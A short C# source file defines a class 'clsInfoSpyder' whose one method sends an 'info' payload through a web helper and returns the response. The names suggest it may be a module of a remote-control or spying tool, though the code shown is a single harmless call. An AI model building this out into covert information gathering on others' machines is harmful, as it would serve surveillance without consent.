using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsInfoSpyder : clsfnBase
    {
        private clsWeb m_web { get; set; }

        public clsInfoSpyder(clsWeb web)
        {
            m_web = web;
        }

        public async Task<string> fnszGetInfo()
        {
            try
            {
                return await m_web.fnszSendPayload("info");
            }
            catch (Exception ex)
            {
                return $"ERROR://{ex.Message}";
            }
        }
    }
}
